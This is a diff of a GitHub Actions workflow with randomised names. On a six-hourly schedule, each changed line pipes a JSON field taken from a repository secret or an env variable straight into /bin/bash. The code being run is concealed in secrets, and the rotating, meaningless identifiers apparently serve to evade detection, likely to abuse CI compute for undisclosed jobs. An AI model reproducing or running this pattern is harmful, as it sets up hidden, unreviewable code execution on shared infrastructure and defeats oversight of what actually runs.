@@ -1,9 +1,9 @@
 name: gechundan5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 4/6 * * *'
+    - cron: '7 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: gechundan5678
         env:
-          qo8794: ${{ secrets.qo8794 }}
+          g09: ${{ secrets.g09 }}
         run: |
-          echo $qo8794 | jq -r .xed11696 | /bin/bash
-          echo $k1306 | jq -r .y494 | /bin/bash
-          echo $n40 | jq -r .w8 | /bin/bash
-          echo $lth38965 | jq -r .afmo6 | /bin/bash
-          echo $eihun87233 | jq -r .m29 | /bin/bash
-          echo $szx89 | jq -r .krx0346 | /bin/bash
-          echo $tlix9 | jq -r .y44 | /bin/bash
+          echo $g09 | jq -r .xbaw0424 | /bin/bash
+          echo $rhbmh5 | jq -r .uhcd3769 | /bin/bash
+          echo $t457 | jq -r .hwlf64558 | /bin/bash
+          echo $dhf83 | jq -r .lktg700 | /bin/bash
+          echo $fqsy437 | jq -r .pe81150 | /bin/bash
+          echo $lp42857 | jq -r .c468 | /bin/bash
+          echo $o2400 | jq -r .vd824 | /bin/bash
+          echo $uhz98 | jq -r .an24154 | /bin/bash
+          echo $jrfd18663 | jq -r .bbwb55626 | /bin/bash
+          echo $sie31215 | jq -r .f6116 | /bin/bash
+          echo $xdh5 | jq -r .nty58426 | /bin/bash
+          echo $jysn1379 | jq -r .uy1343 | /bin/bash
 
